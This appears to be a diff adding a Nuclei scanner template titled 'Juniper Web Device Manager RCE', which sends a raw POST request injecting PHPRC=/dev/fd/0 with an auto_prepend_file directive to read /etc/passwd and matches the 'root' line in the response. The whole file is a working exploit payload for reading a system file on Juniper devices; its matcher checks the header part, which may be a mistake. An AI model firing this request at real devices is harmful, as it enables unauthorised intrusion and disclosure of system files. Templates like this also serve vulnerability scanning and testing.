@@ -1,0 +1,22 @@
+id: Juniper-RCE
+info:
+  name: Juniper Web Device Manager RCE
+  author: Stux
+  severity: critical
+  tags: 
+    - rce
+    - stux
+
+http:
+  - raw:
+      - |
+        POST /?PHPRC=/dev/fd/0 HTTP/1.1
+        Host: {{Hostname}}
+
+        auto_prepend_file="/etc/passwd"
+
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "root:[x*]:0:0"
